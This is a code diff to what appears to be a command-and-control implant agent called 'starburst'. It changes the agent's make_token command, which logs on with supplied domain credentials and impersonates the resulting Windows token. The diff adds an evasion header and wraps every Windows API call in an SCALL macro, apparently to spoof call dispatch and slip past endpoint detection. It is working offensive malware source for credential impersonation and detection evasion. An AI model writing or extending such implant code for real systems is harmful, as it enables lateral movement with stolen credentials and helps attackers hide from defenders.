@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_MAKE_TOKEN
 
@@ -43,12 +44,12 @@ auto declfn starburst::cmd_make_token(
     wchar_t w_domain[128] = { 0 };
     wchar_t w_user[128] = { 0 };
     wchar_t w_pass[256] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, domain_buf, -1, w_domain, 128 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, user_buf, -1, w_user, 128 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, pass_buf, -1, w_pass, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, domain_buf, -1, w_domain, 128 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, user_buf, -1, w_user, 128 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, pass_buf, -1, w_pass, 256 );
 
     HANDLE h_token = nullptr;
-    BOOL ok = inst.advapi32.LogonUserW(
+    BOOL ok = (BOOL)SCALL( inst, advapi32.LogonUserW,
         w_user, w_domain, w_pass,
         9,     // LOGON32_LOGON_NEW_CREDENTIALS
         0,     // LOGON32_PROVIDER_DEFAULT
@@ -65,8 +66,8 @@ auto declfn starburst::cmd_make_token(
         return;
     }
 
-    if ( !inst.advapi32.ImpersonateLoggedOnUser( h_token ) ) {
-        inst.kernel32.CloseHandle( h_token );
+    if ( !SCALL( inst, advapi32.ImpersonateLoggedOnUser, h_token ) ) {
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
         return;
@@ -74,7 +75,7 @@ auto declfn starburst::cmd_make_token(
 
     // close old token if one exists
     if ( inst.agent.impersonated_token )
-        inst.kernel32.CloseHandle( inst.agent.impersonated_token );
+        SCALL( inst, kernel32.CloseHandle, inst.agent.impersonated_token );
 
     inst.agent.impersonated_token = h_token;
 
